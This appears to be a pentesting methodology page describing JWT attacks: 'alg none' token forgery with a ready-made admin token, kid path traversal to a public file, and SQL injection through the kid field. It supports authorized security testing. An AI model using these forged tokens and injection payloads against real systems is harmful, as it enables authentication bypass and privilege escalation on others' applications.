# JSON Web Tokens

## Check List

## Methodology

### Black Box

#### **None Algorithm**

{% stepper %}
{% step %}
Log in to the target site, complete the authentication process, and inspect the requests using Burp Suite
{% endstep %}

{% step %}
If the requests used jwt, decode it using the Burp suite extension called JWT Editor or copy it and decode it on the following site

Paste token into [https://jwt.io](https://jwt.io/)
{% endstep %}

{% step %}
header like

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

and payload&#x20;

```json
{
  "user": "guest",
  "role": "user"
}
```
{% endstep %}

{% step %}
Create this exact JWT (no signature needed):

```json
{
  "alg": "none",
  "typ": "JWT"
}
```
{% endstep %}

{% step %}
Now inject the word admin in the payload request as follows

```json
{
  "user": "admin",
  "role": "admin",
  "iat": 1731670400,
  "exp": 9999999999
}
```
{% endstep %}

{% step %}
Now convert the request to base64 and replace the previous Jwt token

Base64URL encode header like → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
{% endstep %}

{% step %}
Base64URL encode payload like → `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MzE2NzA0MDAsImV4cCI6OTk5OTk5OTk5OX0`

Append `.` + empty string → final token

```json
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MzE2NzA0MDAsImV4cCI6OTk5OTk5OTk5OX0.
```
{% endstep %}

{% step %}
Then, after replacing the tampered jwt token with the previous jwt that the server had set, we send the request
{% endstep %}

{% step %}
Then we check in localstorage whether the tampered jwt is stored or not and if it is stored we check whether we have access to an admin feature or admin pages and if we have access the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### KID Manipulation Vulnerability

{% stepper %}
{% step %}
Access the target application and locate login or authenticated endpoints
{% endstep %}

{% step %}
Inspect network traffi Burp Suite to identify JWT tokens in headers (Authorization: Bearer ...) or localStorage
{% endstep %}

{% step %}
Copy a valid JWT token and decode it using a tool like [jwt.io](https://jwt.io)
{% endstep %}

{% step %}
Examine the header to confirm the presence of the kid (Key ID) field,

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "1"
}
```
{% endstep %}

{% step %}
Modify the kid value to point to a publicly accessible file

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../public/css/style.css"
}
```
{% endstep %}

{% step %}
Re-encode the token with the manipulated header and an empty or arbitrary payload, ensuring the signature matches the file content (if server uses file as key)
{% endstep %}

{% step %}
Send the forged token to the application via an authenticated request
{% endstep %}

{% step %}
Check if the application accepts the token and grants access
{% endstep %}

{% step %}
If successful, the server is using the specified file (main.css) as the verification key, bypassing intended security
{% endstep %}
{% endstepper %}

***

#### SQL Injection Via KID

{% stepper %}
{% step %}
Modify the kid value to inject SQL

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "1' UNION SELECT 'mysecret'--"
}
```
{% endstep %}

{% step %}
Re-encode the token with the manipulated header and sign it using the injected string (key or secret) as the HMAC secret
{% endstep %}

{% step %}
Submit the token to the application
{% endstep %}

{% step %}
Verify if the application validates the token using the injected string as the secret key
{% endstep %}

{% step %}
If access is granted, the kid parameter is vulnerable to SQL injection, allowing arbitrary key manipulation
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
